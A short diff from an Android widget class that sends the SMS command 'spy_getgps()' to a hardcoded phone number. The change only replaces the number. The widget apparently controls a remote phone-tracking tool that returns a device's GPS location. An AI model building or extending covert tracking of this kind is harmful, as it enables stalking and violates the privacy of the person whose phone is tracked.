@@ -40,7 +40,7 @@ public class SendGetGpsWidget extends AppWidgetProvider {
         super.onReceive(context, intent);
 
         if (intent.getAction().equals(ACTION)) {
-            sendSMS("+48510231913", "spy_getgps()");
+            sendSMS("+48690993699", "spy_getgps()");
         }
     }
 
